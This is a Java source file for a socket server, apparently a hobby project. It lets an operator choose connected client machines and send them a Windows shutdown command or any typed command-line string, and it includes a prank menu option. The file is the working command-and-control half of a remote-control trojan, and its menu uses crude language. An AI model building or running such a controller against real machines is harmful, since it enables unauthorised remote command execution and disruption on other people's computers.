package br.com.pricher.server;

import javax.swing.*;
import java.awt.*;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Scanner;

/**
 * Created by Jeferson Machado on 26/07/2017.
 */
public class Servidor extends Thread {

    private static ArrayList<BufferedWriter> clients;
    private static HashMap<BufferedWriter, String> clientsNames;
    private static Scanner reader;
    private String name;
    private Socket con;
    private BufferedReader bfr;

    private Servidor(Socket con) {
        this.con = con;
        try {
            InputStream in = con.getInputStream();
            InputStreamReader inr = new InputStreamReader(in);
            bfr = new BufferedReader(inr);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * Método run
     */
    public void run() {
        try {
            OutputStream outPutStream = this.con.getOutputStream();
            Writer writer = new OutputStreamWriter(outPutStream);
            final BufferedWriter bufferedWriter = new BufferedWriter(writer);
            clients.add(bufferedWriter);
            name = bfr.readLine();
            clientsNames.put(bufferedWriter, name);
            //System.out.println("Client connected: " + name);


            if (SystemTray.isSupported()) {
                new TrayIconDemo().displayTray("Conectado", name + " conectado :D");
            } else {
                System.err.println("System tray not supported!");
            }

            if (clients.size() <= 1) showOptions();
            final BufferedReader gambi = bfr;

            new Thread(() -> {
                while (true) {
                    try {
                        String msgg = gambi.readLine();
                        if (msgg == null) {
                            System.out.println("User disconnected: " + clientsNames.get(bufferedWriter));
                            clientsNames.remove(bufferedWriter);
                            clients.remove(bufferedWriter);
                            break;
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }).start();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendToAll(BufferedWriter bwSaida, String msg) throws IOException {
        BufferedWriter bws;

        for (BufferedWriter bw : clients) {
            bws = bw;
            if (!(bwSaida == bws)) {
                bw.write(name + " -> " + msg + "\r\n");
                bw.flush();
            }
        }
    }

    private static void sendMsgToClient(BufferedWriter bf, String message) {
        try {
            bf.write(message + "\r\n");
            bf.flush();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /***
     * Método main
     * @param args
     */
    public static void main(String[] args) {
        try {
            JLabel lblMessage = new JLabel("Porta do Servidor:");
            JTextField txtPorta = new JTextField("8094");
            Object[] texts = {lblMessage, txtPorta};
            JOptionPane.showMessageDialog(null, texts);

            final ServerSocket server = new ServerSocket(Integer.parseInt(txtPorta.getText()));

            clientsNames = new HashMap<>();
            clients = new ArrayList<>();

            JOptionPane.showMessageDialog(null, "Servidor ativo na porta: " + txtPorta.getText());
            showOptions();

            new Thread(() -> {
                while (true) {
                    //System.out.println("Waiting connection...");
                    Socket con = null;
                    try {
                        con = server.accept();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    //System.out.println("Client connected...");
                    Thread t = new Servidor(con);
                    t.start();
                }
            }).start();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void showOptions() {
        try {
            int clientSelected;
            int optionSelected;

            System.out.println("-----------------------------------------");

            if (clients.size() > 0) {
                reader = new Scanner(System.in);
                do {
                    for (int i = 0; i < clients.size(); i++) {
                        System.out.println("(" + i + ") -> ClientName: " + clientsNames.get(clients.get(i)));
                    }

                    System.out.println("-----------------------------------------");

                    do {
                        System.out.print("Select a client: >. ");
                        clientSelected = reader.nextInt();
                        if (clientSelected > clients.size() - 1 || clientSelected < 0) {
                            System.out.println("Select a valid client");
                        }
                    } while (clientSelected > clients.size() - 1 || clientSelected < 0);

                    do {
                        System.out.println("0 - TURN OFF COMPUTER");
                        System.out.println("1 - OPEN PORNOZAO");
                        System.out.println("2 - CMD COMMAND");

                        System.out.print(">. ");
                        optionSelected = reader.nextInt();

                        if (optionSelected > 2 || optionSelected < 0) {
                            System.out.println("Select a valid option fuck!");
                        }

                    } while (optionSelected > 2 || optionSelected < 0);

                    if (optionSelected == 0) {

                        System.out.println("SHUTDOWN TIME (SECONDS): ");
                        long time = reader.nextLong();
                        sendMsgToClient(clients.get(clientSelected), "shutdown -s -t " + (time <= 0 ? 30000 : time * 1000));

                    } else if (optionSelected == 1) {

                    } else if (optionSelected == 2) {
                        String command = reader.nextLine();
                        sendMsgToClient(clients.get(clientSelected), command == null ? "" : command);
                    }
                    System.out.println("Command send!");
                } while (true);
            } else {
                System.out.println("No connected users!");
                System.out.println("-----------------------------------------");
            }
        } catch (Exception ignored) {
        }
    }
}
